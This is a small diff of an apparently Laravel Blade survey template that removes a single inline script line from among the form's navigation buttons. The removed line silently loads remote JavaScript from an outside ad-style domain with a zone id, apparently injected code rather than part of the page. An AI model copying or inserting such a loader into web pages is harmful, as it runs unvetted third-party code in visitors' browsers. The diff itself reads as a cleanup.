@@ -105,7 +105,6 @@
              href="{{ route('surveys.show', [$survey->id, 'sv_step' => max(1,$step-1)]) }}">
             Previous
           </a>
-<script>(function(s){s.dataset.zone='11567849',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
           <button type="submit" class="btn btn-success">Finish & Get Code</button>
 
           <a class="btn btn-outline-dark ms-auto" href="{{ route('surveys.index') }}">Back to list</a>
